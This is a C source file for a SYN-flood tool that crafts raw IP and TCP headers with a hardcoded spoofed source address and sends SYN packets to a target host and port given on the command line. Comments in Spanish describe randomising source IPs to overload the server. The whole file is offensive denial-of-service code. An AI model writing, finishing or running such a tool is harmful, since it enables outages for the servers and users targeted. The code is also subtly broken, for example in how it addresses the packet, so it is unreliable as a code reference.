#include "ip-headers.h"
#include "ip-constructors.c"

int main(int argc,char* argv[]){
    if(argc==0) fprintf(stdout,"Usage: syn-flood --dest www.host.domain --port port");
	else{
		char* source_address = "155.155.155.155"; // Generar ips origen aleatorias para forzar al servidor a recibir syn's //
		char* source_port    = "25";		      // Con los puertos igual
		char* remote_address = argv[2];
		char* remote_port    = argv[4];		
		int sock = get_socket_descriptor();
		char buffer[PCKT_LEN]; memset(buffer,0,PCKT_LEN);
		struct sockaddr_in myaddr;
		fprintf(stdout,"filling sockaddr_in ...\n");
		set_sockaddr_in(&myaddr,source_address,source_port);
		fprintf(stdout,"filled sockaddr_in ! \n");
		IP_HEADER *ip_hdr   = (IP_HEADER *)buffer;
		TCP_HEADER *tcp_hdr = (TCP_HEADER *) (buffer + sizeof(IP_HEADER));
		fprintf(stdout,"filling IP HEADER ...\n");
		set_ip_header(ip_hdr,source_address,remote_address);
		fprintf(stdout,"filled IP HEADER ! \nfilling TCP HEADER ...\n");
		set_tcp_header_syn_flood(tcp_hdr,source_port,remote_port,buffer);
		fprintf(stdout,"filled TCP HEADER ! \nKernel, not fill my header ...\n");
		if(kernel_not_fill_my_header(sock)<0) fprintf(stderr,"Setsockopt not working");
		fprintf(stdout,"Kernel, not fill my header completed !\nSending test datagram...\n");
		fprintf(stdout,"%d,%d",tcp_hdr->flag_rst,htons(tcp_hdr->remote_port));
		if(sendto(sock, buffer, ip_hdr->total_length, 0, (struct sockaddr *)&myaddr, sizeof(myaddr))>=0){
			fprintf(stdout,"Send completed, working\n\n");
		}

	}
	return 0;
}




